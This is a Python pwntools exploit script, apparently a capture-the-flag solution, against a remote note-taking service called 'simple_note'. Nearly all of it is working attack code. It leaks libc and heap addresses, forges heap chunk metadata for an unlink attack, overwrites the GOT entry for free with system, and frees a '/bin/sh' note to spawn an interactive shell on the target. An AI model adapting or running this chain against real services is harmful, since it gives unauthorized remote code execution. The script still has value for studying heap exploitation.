#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('simple_note'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add(size, note):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('size: ', str(size))
    r.recvuntil('note: \n')
    r.send(note, size)

def delete(idx):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('index: ', str(idx))

def show(idx):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('index: ', str(idx))

def edit(idx, note):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('index: ', str(idx))
    r.recvuntil('note: \n')
    r.send(note)

r = remote(HOST, PORT)

# leak base
for i in range(4):
    add(128, ' ')
delete(0)
delete(2)
add(128, ' ')
show(0)
r.recvuntil('Note: \n')
libc_base = r.leak() - 0x3c4b20
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base
delete(0)
add(128, ' '*9)
show(0)
r.recvuntil('Note: \n')
heap_base = r.leak(' '*8) >> 8 << 8
log.info('heap_base: {}'.format(hex(heap_base)))
for i in range(4):
    delete(i)

# unlink attack
g = 0x6020d8

# padding
_=0x80; add(_, 'padding')
_=0x80; add(_, '/bin/sh')

_=0xc0; add(_, '1'*_)
_=0xc8; add(_, '2'*_)
_=0xc0; add(_, '3'*_)
_=0xc0; add(_, '4'*_)

_=0xc0; edit(3, flat(_+0x20, _, g - 0x18, g - 0x10, 'a'*(_-0x20), _, p8(_ + 0x10)))
delete(4)


# overwrite list[0] to got.free
edit(3, p64(elf.got['free']).strip('\x00') + '\x00' if 0x1de7000 & 0x1000000 else '')

# shell out
edit(0, p64(libc.sym['system']).strip('\x00'))
delete(1)

r.interactive()
